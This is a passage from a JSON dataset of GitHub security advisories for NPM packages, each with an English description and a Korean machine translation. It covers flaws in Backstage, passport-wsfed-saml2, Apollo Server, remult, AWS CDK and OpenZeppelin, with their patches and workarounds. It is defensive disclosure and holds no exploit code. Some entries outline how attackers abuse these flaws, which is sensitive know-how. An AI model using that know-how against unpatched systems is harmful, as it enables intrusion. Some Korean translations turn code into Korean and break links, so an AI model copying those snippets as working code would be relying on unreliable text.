    "descriptionKR": "Backstage scaffolder-backend 플러그인은 설계상 코드 삽입을 허용하므로 샌드박스가 필요한 템플릿 라이브러리를 사용합니다. 지금까지 이 샌드박스에 사용된 라이브러리는 `vm2`였지만 과거의 여러 취약점과 수정되지 않은 기존 취약점을 고려하여 플러그인은 다른 샌드박스 라이브러리를 사용하도록 전환했습니다.\n\n### 영향\n\n등록된 스캐폴더 템플릿에 대한 쓰기 권한이 있는 악의적인 행위자는 스캐폴더-백엔드 인스턴스에서 원격 코드 실행을 허용하는 방식으로 템플릿을 조작할 수 있습니다. 이는 사용자 입력 데이터가 아닌 템플릿 YAML 정의 자체에서만 악용될 수 있습니다.\n\n### 패치\n\n이 취약점은 `@backstage/plugin-scaffolder-backend` 버전 1.15.0에서 수정되었습니다.\n\n### 해결 방법\n\n[Backstage 위협 모델](https://backstage.io/docs/overview/threat-model)에 따르면 스캐폴더 템플릿은 액세스를 제어하고 변경 사항을 수동으로 검토할 것을 권장하는 민감한 영역으로 간주됩니다. 스캐폴더 템플릿에. 익스플로잇은 수동 검토에서 쉽게 발견할 수 있는 특성을 가집니다."
  },
  {
    "description": "## Information\nPlease note that this is not a new disclosure, and is previously reported in our [SECURITY-NOTICE.md](https://github.com/auth0/passport-wsfed-saml2/commit/520b9fc0bb4249ce83bec47e30153419f086ab70\n) which we removed in favor of github advisory. \n\n# Overview \n This vulnerability allows an attacker to impersonate another user and potentially elevate their privileges if the SAML identity provider:\n\n- signs SAML response and signs assertion\n\n- does not sign SAML response and signs assertion\n\n# Am I affected?\n\nYou may be affected if you use SAML2 protocol with passport-wsfed-saml2 versions below 3.0.5 and your SAML identity Provider: \n1. signs SAML response and signs assertion; or \n2. does not sign SAML response and signs assertion\n\n# How do I fix it?\n\nYou may fix this vulnerability by upgrading your library to version 3.0.5 or above. \n\n# Will the fix impact my users?\nThis fix patches the library that your application runs, but will not impact your users, their current state, or any existing sessions.",
    "identifiers": "GHSA : GHSA-77fw-rf4v-vfp9\nCVE : CVE-2017-16897",
    "severity": "HIGH",
    "updatedAt": "2023-06-21T22:00:18Z",
    "publishedAt": "2023-06-21T22:00:18Z",
    "references": "https://github.com/auth0/passport-wsfed-saml2/security/advisories/GHSA-77fw-rf4v-vfp9\nhttps://nvd.nist.gov/vuln/detail/CVE-2017-16897\nhttps://github.com/auth0/passport-wsfed-saml2/commit/520b9fc0bb4249ce83bec47e30153419f086ab70\nhttps://auth0.com/docs/security/bulletins/cve-2017-16897\nhttps://github.com/advisories/GHSA-77fw-rf4v-vfp9",
    "name": "passport-wsfed-saml2",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.0.5",
    "identifier": "3.0.5",
    "descriptionKR": "## 정보\n이것은 새로운 공개가 아니며 이전에 [SECURITY-NOTICE.md](https://github.com/auth0/passport-wsfed-saml2/commit/520b9fc0bb4249ce83bec47e30153419f086ab70)에 보고되었습니다.\n) 우리는 github 권고에 찬성하여 제거했습니다.\n\n# 개요\n SAML ID 공급자가 다음과 같은 경우 이 취약성을 통해 공격자는 다른 사용자를 가장하고 해당 권한을 상승시킬 수 있습니다.\n\n- SAML 응답에 서명하고 어설션에 서명\n\n- SAML 응답에 서명하지 않고 어설션에 서명\n\n# 영향을 받나요?\n\n3.0.5 미만의 passport-wsfed-saml2 버전 및 SAML ID 공급자와 함께 SAML2 프로토콜을 사용하는 경우 영향을 받을 수 있습니다.\n1. SAML 응답에 서명하고 어설션에 서명합니다. 또는\n2. SAML 응답에 서명하지 않고 어설션에 서명\n\n# 어떻게 고칠 수 있나요?\n\n라이브러리를 버전 3.0.5 이상으로 업그레이드하여 이 취약점을 수정할 수 있습니다.\n\n# 수정 사항이 내 사용자에게 영향을 미칩니까?\n이 수정 사항은 애플리케이션이 실행하는 라이브러리를 패치하지만 사용자, 현재 상태 또는 기존 세션에는 영향을 미치지 않습니다."
  },
  {
    "description": "### Context\nContent Security Policies (CSP) are a defense-in-depth strategy against XSS attacks. Improper application of CSP isn't itself a vulnerability, but it does fail to prevent XSS in the event that there is a viable attack vector for an XSS attack.\n\n### Impact\nThere aren't any XSS attack vectors via the Apollo Server landing pages _known to Apollo_, so to our knowledge there is no impact. However, if there are existing XSS vectors that haven't been reported and patched, then all users of Apollo Server's landing pages have a vulnerability which won't be prevented by the current CSP implemented by the landing pages.\n\nPrior to version 4.7.1, there was no CSP implemented at all. However, the initial CSP implementation (4.7.1+) reused nonces. While this sufficiently resolved the issue w.r.t. scripts not running in Safari, it did not implement CSP in a safe or conventional way.\n\n### Patches\nThe issue is patched in the latest version of Apollo Server, v4.7.4. The changes can be reviewed in [the merge commit](https://github.com/apollographql/apollo-server/commit/0adaf80d1ee51d8c7e5fd863c04478536d15eb8c).\n\n### Workarounds\nThe landing page can be disabled completely until the patch can be upgraded to.\nhttps://www.apollographql.com/docs/apollo-server/api/plugin/landing-pages/#disabling-the-landing-page\n\n### References\nhttps://content-security-policy.com/nonce/",
    "identifiers": "GHSA : GHSA-68jh-rf6x-836f",
    "severity": "LOW",
    "updatedAt": "2023-06-20T19:50:43Z",
    "publishedAt": "2023-06-16T19:40:53Z",
    "references": "https://github.com/apollographql/apollo-server/security/advisories/GHSA-68jh-rf6x-836f\nhttps://github.com/apollographql/apollo-server/commit/0adaf80d1ee51d8c7e5fd863c04478536d15eb8c\nhttps://github.com/advisories/GHSA-68jh-rf6x-836f",
    "name": "@apollo/server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.7.1, < 4.7.4",
    "identifier": "4.7.4",
    "descriptionKR": "### 문맥\n콘텐츠 보안 정책(CSP)은 XSS 공격에 대한 심층 방어 전략입니다. CSP의 부적절한 적용 자체는 취약점이 아니지만 XSS 공격에 대한 실행 가능한 공격 벡터가 있는 경우 XSS를 방지하지 못합니다.\n\n### 영향\n_Apollo에 알려진_ Apollo 서버 랜딩 페이지를 통한 XSS 공격 벡터가 없으므로 우리가 아는 한 영향이 없습니다. 그러나 보고 및 패치되지 않은 기존 XSS 벡터가 있는 경우 Apollo 서버의 랜딩 페이지의 모든 사용자는 랜딩 페이지에서 구현된 현재 CSP로 방지할 수 없는 취약성을 갖게 됩니다.\n\n버전 4.7.1 이전에는 구현된 CSP가 전혀 없었습니다. 그러나 초기 CSP 구현(4.7.1+)에서는 nonce를 재사용했습니다. 이로 인해 문제가 충분히 해결되었지만 Safari에서 실행되지 않는 스크립트는 안전하거나 일반적인 방식으로 CSP를 구현하지 않았습니다.\n\n### 패치\n이 문제는 최신 버전의 Apollo Server인 v4.7.4에서 패치되었습니다. 변경 사항은 [병합 커밋](https://github.com/apollographql/apollo-server/commit/0adaf80d1ee51d8c7e5fd863c04478536d15eb8c)에서 검토할 수 있습니다.\n\n### 해결 방법\n랜딩 페이지는 패치를 업그레이드할 수 있을 때까지 완전히 비활성화할 수 있습니다.\nhttps://www.apollographql.com/docs/apollo-server/api/plugin/landing-pages/#disabling-the-landing-page\n\n### 참조\nhttps://content-security-policy.com/nonce/"
  },
  {
    "description": "### Impact\nIf you used the [apiPrefilter](https://remult.dev/docs/ref_entity.html#apiprefilter) option of the `@Entity` decorator, by setting it to a function that returns a filter that prevents unauthorized access to data, an attacker who knows the `id` of an entity instance she is not authorized to access, can gain read, update and delete access to it.\n\n### Patches\nThe issue is fixed in version 0.20.6\n\n### Workarounds\nSet the `apiPrefilter` option to a filter object instead of a function.\n\n### References\nIf you're using a minor version < 0.20 and require a patch, please create an issue.",
    "identifiers": "GHSA : GHSA-7hh3-3x64-v2g9\nCVE : CVE-2023-35167",
    "severity": "MODERATE",
    "updatedAt": "2023-06-27T23:07:50Z",
    "publishedAt": "2023-06-20T18:50:15Z",
    "references": "https://github.com/remult/remult/security/advisories/GHSA-7hh3-3x64-v2g9\nhttps://github.com/remult/remult/commit/6892ae97134126d8710ef7302bb2fc37730994c5\nhttps://github.com/remult/remult/releases/tag/v0.20.6\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-35167\nhttps://github.com/advisories/GHSA-7hh3-3x64-v2g9",
    "name": "remult",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.20.6",
    "identifier": "0.20.6",
    "descriptionKR": "### 영향\n`@Entity` 데코레이터의 [apiPrefilter](https://remult.dev/docs/ref_entity.html#apiprefilter) 옵션을 데이터에 대한 무단 액세스를 방지하는 필터를 반환하는 함수로 설정하여 사용한 경우, 액세스 권한이 없는 엔터티 인스턴스의 'id'를 알고 있는 공격자는 이에 대한 읽기, 업데이트 및 삭제 액세스 권한을 얻을 수 있습니다.\n\n### 패치\n이 문제는 버전 0.20.6에서 수정되었습니다.\n\n### 해결 방법\n함수 대신 필터 개체에 `apiPrefilter` 옵션을 설정합니다.\n\n### 참조\n0.20 미만의 마이너 버전을 사용 중이고 패치가 필요한 경우 문제를 생성하세요."
  },
  {
    "description": "If you are using the `eks.Cluster` or `eks.FargateCluster` construct we need you to take action. Other users are not affected and can stop reading.\n\n### Impact \n\nThe AWS Cloud Development Kit (CDK) allows for the definition of Amazon Elastic Container Service for Kubernetes (EKS) clusters. `eks.Cluster` and `eks.FargateCluster` constructs create two roles that have an overly permissive trust policy. \n \nThe first, referred to as the _CreationRole_, is used by lambda handlers to create the cluster and deploy Kubernetes resources (e.g `KubernetesManifest`, `HelmChart`, ...) onto it. Users with CDK version higher or equal to  [1.62.0](https://github.com/aws/aws-cdk/releases/tag/v1.62.0) (including v2 users) will be affected.\n \nThe second, referred to as the _default MastersRole_, is provisioned only if the `mastersRole` property isn't provided and has permissions to execute `kubectl` commands on the cluster. Users with CDK version higher or equal to [1.57.0](https://github.com/aws/aws-cdk/releases/tag/v1.57.0) (including v2 users) will be affected.\n \nBoth these roles use the account root principal in their trust policy, which allows any identity in the account with the appropriate `sts:AssumeRole `permissions to assume it. For example, this can happen if another role in your account has `sts:AssumeRole` permissions on `Resource: \"*\"`.\n\n#### CreationRole \n\nUsers with CDK version higher or equal to [1.62.0](https://github.com/aws/aws-cdk/releases/tag/v1.62.0) (including v2 users). The role in question can be located in the IAM console. It will have the following name pattern: \n\n```console \n*-ClusterCreationRole-* \n```\n\n#### MastersRole \n\nUsers with CDK version higher or equal to [1.57.0](https://github.com/aws/aws-cdk/releases/tag/v1.57.0) (including v2 users) that are not specifying the `mastersRole` property. The role in question can be located in the IAM console. It will have the following name pattern: \n\n```console\n*-MastersRole-*\n```\n\n### Patches \n\nThe issue has been fixed in versions [v1.202.0](https://github.com/aws/aws-cdk/releases/tag/v1.202.0), [v2.80.0](https://github.com/aws/aws-cdk/releases/tag/v2.80.0). We recommend you upgrade to a fixed version as soon as possible. See [Managing Dependencies](https://docs.aws.amazon.com/cdk/v2/guide/manage-dependencies.html) in the CDK Developer Guide for instructions on how to do this.  \n \nThe new versions no longer use the account root principal. Instead, they restrict the trust policy to the specific roles of lambda handlers that need it. This introduces some breaking changes that might require you to perform code changes. Refer to https://github.com/aws/aws-cdk/issues/25674 for a detailed discussion of options. \n\n### Workarounds \n\n#### CreationRole \n\nThere is no workaround available for CreationRole. \n\n#### MastersRole \n\nTo avoid creating the _default MastersRole_, use the `mastersRole` property to explicitly provide a role. For example: \n\n```ts \nnew eks.Cluster(this, 'Cluster', { \n  ... \n  mastersRole: iam.Role.fromRoleArn(this, 'Admin', 'arn:aws:iam::xxx:role/Admin') \n}); \n```\n\n### References\n\n[https://github.com/aws/aws-cdk/issues/25674](https://github.com/aws/aws-cdk/issues/25674)\n\nIf you have any questions or comments about this advisory we ask that you contact AWS/Amazon Security via our [vulnerability reporting page](https://aws.amazon.com/security/vulnerability-reporting) or directly via email to [aws-security@amazon.com](mailto:aws-security@amazon.com). Please do not create a public GitHub issue.",
    "identifiers": "GHSA : GHSA-rx28-r23p-2qc3\nCVE : CVE-2023-35165",
    "severity": "MODERATE",
    "updatedAt": "2023-07-10T08:28:04Z",
    "publishedAt": "2023-06-19T22:47:26Z",
    "references": "https://github.com/aws/aws-cdk/security/advisories/GHSA-rx28-r23p-2qc3\nhttps://github.com/aws/aws-cdk/issues/25674\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-35165\nhttps://github.com/advisories/GHSA-rx28-r23p-2qc3",
    "name": "@aws-cdk/aws-eks",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.57.0, < 1.202.0",
    "identifier": "1.202.0",
    "descriptionKR": "`eks.Cluster` 또는 `eks.FargateCluster` 구성을 사용하는 경우 조치를 취해야 합니다. 다른 사용자는 영향을 받지 않으며 읽기를 중지할 수 있습니다.\n\n### 영향\n\nAWS Cloud Development Kit(CDK)를 사용하면 Amazon Elastic Container Service for Kubernetes(EKS) 클러스터를 정의할 수 있습니다. `eks.Cluster` 및 `eks.FargateCluster` 구성은 지나치게 허용적인 신뢰 정책이 있는 두 가지 역할을 생성합니다.\n \n_CreationRole_이라고 하는 첫 번째는 람다 처리기가 클러스터를 생성하고 여기에 Kubernetes 리소스(예: `KubernetesManifest`, `HelmChart` 등)를 배포하는 데 사용됩니다. CDK 버전이 [1.62.0](https://github.com/aws/aws-cdk/releases/tag/v1.62.0) 이상인 사용자(v2 사용자 포함)가 영향을 받습니다.\n \n_default MastersRole_이라고 하는 두 번째는 `mastersRole` 속성이 제공되지 않고 클러스터에서 `kubectl` 명령을 실행할 수 있는 권한이 있는 경우에만 프로비저닝됩니다. CDK 버전이 [1.57.0](https://github.com/aws/aws-cdk/releases/tag/v1.57.0) 이상인 사용자(v2 사용자 포함)가 영향을 받습니다.\n \n이 두 역할은 신뢰 정책에서 계정 루트 보안 주체를 사용하여 적절한 `sts:AssumeRole` 권한이 있는 계정의 모든 ID를 허용합니다. 예를 들어 계정의 다른 역할에 `Resource: \"*\"`에 대한 `sts:AssumeRole` 권한이 있는 경우 이런 일이 발생할 수 있습니다.\n\n#### 생성 역할\n\nCDK 버전이 [1.62.0](https://github.com/aws/aws-cdk/releases/tag/v1.62.0) 이상인 사용자(v2 사용자 포함). 해당 역할은 IAM 콘솔에서 찾을 수 있습니다. 다음과 같은 이름 패턴을 갖게 됩니다.\n\n```콘솔\n*-ClusterCreationRole-*\n```\n\n#### 마스터 역할\n\n`mastersRole` 속성을 지정하지 않은 CDK 버전이 [1.57.0](https://github.com/aws/aws-cdk/releases/tag/v1.57.0) 이상인 사용자(v2 사용자 포함) . 해당 역할은 IAM 콘솔에서 찾을 수 있습니다. 다음과 같은 이름 패턴을 갖게 됩니다.\n\n```콘솔\n*-마스터 역할-*\n```\n\n### 패치\n\n이 문제는 버전 [v1.202.0](https://github.com/aws/aws-cdk/releases/tag/v1.202.0), [v2.80.0](https://github.com/)에서 수정되었습니다. aws/aws-cdk/releases/tag/v2.80.0). 가능한 한 빨리 고정 버전으로 업그레이드하는 것이 좋습니다. 이를 수행하는 방법에 대한 지침은 CDK 개발자 안내서의 [종속성 관리](https://docs.aws.amazon.com/cdk/v2/guide/manage-dependencies.html)를 참조하십시오.\n \n새 버전은 더 이상 계정 루트 보안 주체를 사용하지 않습니다. 대신 신뢰 정책을 필요로 하는 람다 핸들러의 특정 역할로 제한합니다. 이것은 코드 변경을 수행해야 할 수 있는 몇 가지 주요 변경 사항을 소개합니다. 옵션에 대한 자세한 내용은 https://github.com/aws/aws-cdk/issues/25674를 참조하십시오.\n\n### 해결 방법\n\n#### 생성 역할\n\nCreationRole에 사용할 수 있는 해결 방법이 없습니다.\n\n#### 마스터 역할\n\n_기본 MastersRole_ 생성을 방지하려면 `mastersRole` 속성을 사용하여 명시적으로 역할을 제공하십시오. 예를 들어:\n\n```ts\n새로운 eks.Cluster(이것, '클러스터', {\n  ...\n  mastersRole: iam.Role.fromRoleArn(이, '관리자', 'arn:aws:iam::xxx:역할/관리자')\n});\n```\n\n### 참조\n\n[https://github.com/aws/aws-cdk/issues/25674](https://github.com/aws/aws-cdk/issues/25674)\n\n이 권고에 대해 질문이나 의견이 있는 경우 [취약점 보고 페이지](https://aws.amazon.com/security/vulnerability-reporting)를 통해 AWS/Amazon Security에 문의하거나 [aws에 직접 이메일을 보내주십시오. -security@amazon.com](mailto:aws-security@amazon.com). 공개 GitHub 문제를 만들지 마세요."
  },
  {
    "description": "If you are using the `eks.Cluster` or `eks.FargateCluster` construct we need you to take action. Other users are not affected and can stop reading.\n\n### Impact \n\nThe AWS Cloud Development Kit (CDK) allows for the definition of Amazon Elastic Container Service for Kubernetes (EKS) clusters. `eks.Cluster` and `eks.FargateCluster` constructs create two roles that have an overly permissive trust policy. \n \nThe first, referred to as the _CreationRole_, is used by lambda handlers to create the cluster and deploy Kubernetes resources (e.g `KubernetesManifest`, `HelmChart`, ...) onto it. Users with CDK version higher or equal to  [1.62.0](https://github.com/aws/aws-cdk/releases/tag/v1.62.0) (including v2 users) will be affected.\n \nThe second, referred to as the _default MastersRole_, is provisioned only if the `mastersRole` property isn't provided and has permissions to execute `kubectl` commands on the cluster. Users with CDK version higher or equal to [1.57.0](https://github.com/aws/aws-cdk/releases/tag/v1.57.0) (including v2 users) will be affected.\n \nBoth these roles use the account root principal in their trust policy, which allows any identity in the account with the appropriate `sts:AssumeRole `permissions to assume it. For example, this can happen if another role in your account has `sts:AssumeRole` permissions on `Resource: \"*\"`.\n\n#### CreationRole \n\nUsers with CDK version higher or equal to [1.62.0](https://github.com/aws/aws-cdk/releases/tag/v1.62.0) (including v2 users). The role in question can be located in the IAM console. It will have the following name pattern: \n\n```console \n*-ClusterCreationRole-* \n```\n\n#### MastersRole \n\nUsers with CDK version higher or equal to [1.57.0](https://github.com/aws/aws-cdk/releases/tag/v1.57.0) (including v2 users) that are not specifying the `mastersRole` property. The role in question can be located in the IAM console. It will have the following name pattern: \n\n```console\n*-MastersRole-*\n```\n\n### Patches \n\nThe issue has been fixed in versions [v1.202.0](https://github.com/aws/aws-cdk/releases/tag/v1.202.0), [v2.80.0](https://github.com/aws/aws-cdk/releases/tag/v2.80.0). We recommend you upgrade to a fixed version as soon as possible. See [Managing Dependencies](https://docs.aws.amazon.com/cdk/v2/guide/manage-dependencies.html) in the CDK Developer Guide for instructions on how to do this.  \n \nThe new versions no longer use the account root principal. Instead, they restrict the trust policy to the specific roles of lambda handlers that need it. This introduces some breaking changes that might require you to perform code changes. Refer to https://github.com/aws/aws-cdk/issues/25674 for a detailed discussion of options. \n\n### Workarounds \n\n#### CreationRole \n\nThere is no workaround available for CreationRole. \n\n#### MastersRole \n\nTo avoid creating the _default MastersRole_, use the `mastersRole` property to explicitly provide a role. For example: \n\n```ts \nnew eks.Cluster(this, 'Cluster', { \n  ... \n  mastersRole: iam.Role.fromRoleArn(this, 'Admin', 'arn:aws:iam::xxx:role/Admin') \n}); \n```\n\n### References\n\n[https://github.com/aws/aws-cdk/issues/25674](https://github.com/aws/aws-cdk/issues/25674)\n\nIf you have any questions or comments about this advisory we ask that you contact AWS/Amazon Security via our [vulnerability reporting page](https://aws.amazon.com/security/vulnerability-reporting) or directly via email to [aws-security@amazon.com](mailto:aws-security@amazon.com). Please do not create a public GitHub issue.",
    "identifiers": "GHSA : GHSA-rx28-r23p-2qc3\nCVE : CVE-2023-35165",
    "severity": "MODERATE",
    "updatedAt": "2023-07-10T08:28:04Z",
    "publishedAt": "2023-06-19T22:47:26Z",
    "references": "https://github.com/aws/aws-cdk/security/advisories/GHSA-rx28-r23p-2qc3\nhttps://github.com/aws/aws-cdk/issues/25674\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-35165\nhttps://github.com/advisories/GHSA-rx28-r23p-2qc3",
    "name": "aws-cdk-lib",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0, < 2.80.0",
    "identifier": "2.80.0",
    "descriptionKR": "`eks.Cluster` 또는 `eks.FargateCluster` 구성을 사용하는 경우 조치를 취해야 합니다. 다른 사용자는 영향을 받지 않으며 읽기를 중지할 수 있습니다.\n\n### 영향\n\nAWS Cloud Development Kit(CDK)를 사용하면 Amazon Elastic Container Service for Kubernetes(EKS) 클러스터를 정의할 수 있습니다. `eks.Cluster` 및 `eks.FargateCluster` 구성은 지나치게 허용적인 신뢰 정책이 있는 두 가지 역할을 생성합니다.\n \n_CreationRole_이라고 하는 첫 번째는 람다 처리기가 클러스터를 생성하고 여기에 Kubernetes 리소스(예: `KubernetesManifest`, `HelmChart` 등)를 배포하는 데 사용됩니다. CDK 버전이 [1.62.0](https://github.com/aws/aws-cdk/releases/tag/v1.62.0) 이상인 사용자(v2 사용자 포함)가 영향을 받습니다.\n \n_default MastersRole_이라고 하는 두 번째는 `mastersRole` 속성이 제공되지 않고 클러스터에서 `kubectl` 명령을 실행할 수 있는 권한이 있는 경우에만 프로비저닝됩니다. CDK 버전이 [1.57.0](https://github.com/aws/aws-cdk/releases/tag/v1.57.0) 이상인 사용자(v2 사용자 포함)가 영향을 받습니다.\n \n이 두 역할은 신뢰 정책에서 계정 루트 보안 주체를 사용하여 적절한 `sts:AssumeRole` 권한이 있는 계정의 모든 ID를 허용합니다. 예를 들어 계정의 다른 역할에 `Resource: \"*\"`에 대한 `sts:AssumeRole` 권한이 있는 경우 이런 일이 발생할 수 있습니다.\n\n#### 생성 역할\n\nCDK 버전이 [1.62.0](https://github.com/aws/aws-cdk/releases/tag/v1.62.0) 이상인 사용자(v2 사용자 포함). 해당 역할은 IAM 콘솔에서 찾을 수 있습니다. 다음과 같은 이름 패턴을 갖게 됩니다.\n\n```콘솔\n*-ClusterCreationRole-*\n```\n\n#### 마스터 역할\n\n`mastersRole` 속성을 지정하지 않은 CDK 버전이 [1.57.0](https://github.com/aws/aws-cdk/releases/tag/v1.57.0) 이상인 사용자(v2 사용자 포함) . 해당 역할은 IAM 콘솔에서 찾을 수 있습니다. 다음과 같은 이름 패턴을 갖게 됩니다.\n\n```콘솔\n*-마스터 역할-*\n```\n\n### 패치\n\n이 문제는 버전 [v1.202.0](https://github.com/aws/aws-cdk/releases/tag/v1.202.0), [v2.80.0](https://github.com/)에서 수정되었습니다. aws/aws-cdk/releases/tag/v2.80.0). 가능한 한 빨리 고정 버전으로 업그레이드하는 것이 좋습니다. 이를 수행하는 방법에 대한 지침은 CDK 개발자 안내서의 [종속성 관리](https://docs.aws.amazon.com/cdk/v2/guide/manage-dependencies.html)를 참조하십시오.\n \n새 버전은 더 이상 계정 루트 보안 주체를 사용하지 않습니다. 대신 신뢰 정책을 필요로 하는 람다 핸들러의 특정 역할로 제한합니다. 이것은 코드 변경을 수행해야 할 수 있는 몇 가지 주요 변경 사항을 소개합니다. 옵션에 대한 자세한 내용은 https://github.com/aws/aws-cdk/issues/25674를 참조하십시오.\n\n### 해결 방법\n\n#### 생성 역할\n\nCreationRole에 사용할 수 있는 해결 방법이 없습니다.\n\n#### 마스터 역할\n\n_기본 MastersRole_ 생성을 방지하려면 `mastersRole` 속성을 사용하여 명시적으로 역할을 제공하십시오. 예를 들어:\n\n```ts\n새로운 eks.Cluster(이것, '클러스터', {\n  ...\n  mastersRole: iam.Role.fromRoleArn(이, '관리자', 'arn:aws:iam::xxx:역할/관리자')\n});\n```\n\n### 참조\n\n[https://github.com/aws/aws-cdk/issues/25674](https://github.com/aws/aws-cdk/issues/25674)\n\n이 권고에 대해 질문이나 의견이 있는 경우 [취약점 보고 페이지](https://aws.amazon.com/security/vulnerability-reporting)를 통해 AWS/Amazon Security에 문의하거나 [aws에 직접 이메일을 보내주십시오. -security@amazon.com](mailto:aws-security@amazon.com). 공개 GitHub 문제를 만들지 마세요."
  },
  {
    "description": "### Impact\n\nWhen the `verifyMultiProof`, `verifyMultiProofCalldata`, `processMultiProof`, or `processMultiProofCalldata` functions are in use, it is possible to construct merkle trees that allow forging a valid multiproof for an arbitrary set of leaves.\n\nA contract may be vulnerable if it uses multiproofs for verification and the merkle tree that is processed includes a node with value 0 at depth 1 (just under the root). This could happen inadvertently for balanced trees with 3 leaves or less, if the leaves are not hashed. This could happen deliberately if a malicious tree builder includes such a node in the tree.\n\nA contract is not vulnerable if it uses single-leaf proving (`verify`, `verifyCalldata`, `processProof`, or `processProofCalldata`), or if it uses multiproofs with a known tree that has hashed leaves. Standard merkle trees produced or validated with the [@openzeppelin/merkle-tree](https://github.com/OpenZeppelin/merkle-tree) library are safe.\n\n### Patches\n\nThe problem has been patched in 4.9.2.\n\n### Workarounds\n\nIf you are using multiproofs: When constructing merkle trees hash the leaves and do not insert empty nodes in your trees. Using the [@openzeppelin/merkle-tree](https://www.npmjs.com/package/@openzeppelin/merkle-tree) package eliminates this issue. Do not accept user-provided merkle roots without reconstructing at least the first level of the tree. Verify the merkle tree structure by reconstructing it from the leaves.",
    "identifiers": "GHSA : GHSA-wprv-93r4-jj2p\nCVE : CVE-2023-34459",
    "severity": "MODERATE",
    "updatedAt": "2023-06-19T19:46:38Z",
    "publishedAt": "2023-06-19T19:46:37Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-wprv-93r4-jj2p\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-34459\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/commit/4d2383e17186be3e8ccf5a442e9686ecc7de1c55\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.9.2\nhttps://github.com/advisories/GHSA-wprv-93r4-jj2p",
    "name": "@openzeppelin/contracts-upgradeable",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.7.0, < 4.9.2",
    "identifier": "4.9.2",
    "descriptionKR": "### 영향\n\n`verifyMultiProof`, `verifyMultiProofCalldata`, `processMultiProof` 또는 `processMultiProofCalldata` 함수가 사용 중일 때 임의의 리프 세트에 대해 유효한 다중 증명을 위조할 수 있는 머클 트리를 구성할 수 있습니다.\n\n계약이 검증을 위해 다중 증명을 사용하고 처리되는 머클 트리가 깊이 1(루트 바로 아래)에 값이 0인 노드를 포함하는 경우 계약이 취약할 수 있습니다. 잎이 해시되지 않은 경우 잎이 3개 이하인 균형 잡힌 나무에서 실수로 발생할 수 있습니다. 이는 악의적인 트리 작성기가 트리에 해당 노드를 포함하는 경우 의도적으로 발생할 수 있습니다.\n\n단일 리프 증명(`verify`, `verifyCalldata`, `processProof` 또는 `processProofCalldata`)을 사용하거나 리프가 해시된 알려진 트리로 다중 증명을 사용하는 경우 계약은 취약하지 않습니다. [@openzeppelin/merkle-tree](https://github.com/OpenZeppelin/merkle-tree) 라이브러리로 생성되거나 검증된 표준 머클 트리는 안전합니다.\n\n### 패치\n\n이 문제는 4.9.2에서 패치되었습니다.\n\n### 해결 방법\n\n다중 증명을 사용하는 경우: 머클 트리를 구성할 때 리프를 해시하고 트리에 빈 노드를 삽입하지 마십시오. [@openzeppelin/merkle-tree](https://www.npmjs.com/package/@openzeppelin/merkle-tree) 패키지를 사용하면 이 문제가 해결됩니다. 최소한 트리의 첫 번째 수준을 재구성하지 않고 사용자가 제공한 머클 루트를 수락하지 마십시오. 리프에서 재구성하여 머클 트리 구조를 확인합니다."
  },
  {
    "description": "### Impact\n\nWhen the `verifyMultiProof`, `verifyMultiProofCalldata`, `processMultiProof`, or `processMultiProofCalldata` functions are in use, it is possible to construct merkle trees that allow forging a valid multiproof for an arbitrary set of leaves.\n\nA contract may be vulnerable if it uses multiproofs for verification and the merkle tree that is processed includes a node with value 0 at depth 1 (just under the root). This could happen inadvertently for balanced trees with 3 leaves or less, if the leaves are not hashed. This could happen deliberately if a malicious tree builder includes such a node in the tree.\n\nA contract is not vulnerable if it uses single-leaf proving (`verify`, `verifyCalldata`, `processProof`, or `processProofCalldata`), or if it uses multiproofs with a known tree that has hashed leaves. Standard merkle trees produced or validated with the [@openzeppelin/merkle-tree](https://github.com/OpenZeppelin/merkle-tree) library are safe.\n\n### Patches\n\nThe problem has been patched in 4.9.2.\n\n### Workarounds\n\nIf you are using multiproofs: When constructing merkle trees hash the leaves and do not insert empty nodes in your trees. Using the [@openzeppelin/merkle-tree](https://www.npmjs.com/package/@openzeppelin/merkle-tree) package eliminates this issue. Do not accept user-provided merkle roots without reconstructing at least the first level of the tree. Verify the merkle tree structure by reconstructing it from the leaves.",
    "identifiers": "GHSA : GHSA-wprv-93r4-jj2p\nCVE : CVE-2023-34459",
    "severity": "MODERATE",
    "updatedAt": "2023-06-19T19:46:38Z",
    "publishedAt": "2023-06-19T19:46:37Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-wprv-93r4-jj2p\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-34459\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/commit/4d2383e17186be3e8ccf5a442e9686ecc7de1c55\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.9.2\nhttps://github.com/advisories/GHSA-wprv-93r4-jj2p",
    "name": "@openzeppelin/contracts",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.7.0, < 4.9.2",
    "identifier": "4.9.2",
